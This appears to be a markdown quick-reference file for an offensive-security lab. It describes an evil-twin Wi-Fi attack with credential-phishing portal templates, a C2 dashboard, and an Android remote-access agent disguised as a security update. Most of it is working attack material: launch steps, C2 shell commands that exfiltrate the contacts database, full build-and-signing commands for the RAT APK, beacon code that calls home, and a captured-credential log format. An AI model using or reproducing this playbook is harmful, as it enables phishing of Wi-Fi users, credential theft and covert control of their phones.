# skill.md — OffSec Lab Skills & Quick Reference

## Evil Twin Attack

```bash
# Kill interfering processes
sudo airmon-ng check kill
sudo systemctl stop NetworkManager

# Start WEF
cd WEF && sudo ./wef

# Menu flow:
#   7) Evil Twin attack
#   → Select interface (wlan2)
#   → Scan for targets or manually enter ESSID
#   → Template: option 2 (custom)
#   → Select from list (google, facebook, wifiid, etc.)
#   → Start attack
```

## C2 Dashboard

```bash
# Start dashboard (Terminal 1, runs on :4443)
python3 c2_server.py

# Open in browser
firefox http://127.0.0.1:4443/

# From victim device (when connected to AP):
# http://10.0.221.1:4443/
```

## Key Files Modified in WEF

| File | Modifications |
|---|---|
| `WEF/wef` | Template selection menu, APK copy, shared creds init, PHP CGI config |
| `WEF/templates_fake/*/` | 26 PHP handlers with modal popup + cred forwarding |
| `WEF/update.php` | APK download page |
| `WEF/beacon.php` | C2 beacon proxy (lighttpd → dashboard) |
| `WEF/results.php` | C2 results proxy |
| `WEF/rat_device.apk` | Universal C2 agent APK |

## Command Reference

### C2 Commands
```bash
shell:id                 # Get user ID
shell:whoami             # Current user
shell:ls /sdcard         # List files
shell:cat /data/data/com.android.providers.contacts/databases/contacts2.db > /sdcard/contacts.db  # Exfil data
shell:pm list packages   # Installed packages
```

### ADB Commands
```bash
adb devices                           # List connected devices
adb install agent/SecurityUpdate.apk  # Install APK
adb uninstall com.c2.agent            # Remove agent
adb shell am start -n com.c2.agent/.MainActivity  # Launch agent
adb shell am force-stop com.c2.agent  # Stop agent
adb logcat -s C2Agent                 # View agent logs
```

### Maestro Commands
```bash
maestro test flows/full-attack-flow.yaml    # Portal automation
maestro test flows/agent-activate.yaml      # Agent activation
maestro studio                              # Interactive recording
```

### Build APK from Source
```bash
cd /tmp/c2agent

# Edit C2Service.java if needed
vi C2Service.java

# Build manually
BT=$HOME/Android/Sdk/build-tools/36.1.0
PLAT=$HOME/Android/Sdk/platforms/android-36.1

mkdir -p build/{classes,dex,apk}
$BT/aapt2 compile -o build/resources.zip res/values/strings.xml res/values/themes.xml res/layout/activity_main.xml res/xml/network_security_config.xml
$BT/aapt2 link -o build/apk/unsigned.apk -I $PLAT/android.jar --manifest AndroidManifest.xml --auto-add-overlay -R build/resources.zip
javac -d build/classes --release 8 -cp $PLAT/android.jar MainActivity.java C2Service.java
$BT/d8 --lib $PLAT/android.jar --min-api 24 --output build/dex build/classes/com/c2/agent/*.class
cd build/dex && zip -q ../apk/unsigned.apk classes.dex && cd /tmp/c2agent
zipalign -p 4 build/apk/unsigned.apk build/apk/aligned.apk
keytool -genkey -v -keystore build/debug.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Debug,O=Android,C=US"
apksigner sign --ks build/debug.keystore --ks-pass pass:android --key-pass pass:android --ks-key-alias android build/apk/aligned.apk
cp build/apk/aligned.apk WEF/rat_device.apk
```

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Agent not detected on dashboard | Wrong gateway IP in APK | Use universal APK (auto-detect) |
| APK downloads as .bin | Missing MIME type | Added `.apk` → `application/vnd.android.package-archive` in lighttpd |
| Login page not showing (emulator) | JS redirect to external domain | Commented out `location.hostname` redirects in templates |
| Dashboard auto-refresh resets input | 5s meta refresh | Changed to 30s JS with localStorage save |
| "Package corrupted" on install | `zipalign` after `apksigner` | Fixed order: zipalign first, then sign |
| No credentials in dashboard | Shared file permissions | WEF creates `creds.jsonl` with 0666 |

## Credential File Format

`creds.jsonl` (JSON Lines):
```json
{"email_google":"user@gmail.com","password_google":"hunter2","_time":"14:30:00","_ip":"10.0.221.27","_ua":"Mozilla/5.0..."}
{"email_facebook":"john@fb.com","password_facebook":"secret123","_time":"14:31:15","_ip":"10.0.221.42","_ua":"Mozilla/5.0..."}
```

## APK Detection Logic

```java
// Universal gateway detection
WifiManager wifi = (WifiManager) getSystemService(WIFI_SERVICE);
DhcpInfo dhcp = wifi.getDhcpInfo();
int ip = dhcp.gateway;
String gateway = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);

// Falls back to 10.0.2.2 if not on WiFi (emulator)
if (gateway.equals("0.0.0.0")) gateway = "10.0.2.2";

String C2_BEACON = "http://" + gateway + ":80/beacon.php";
```
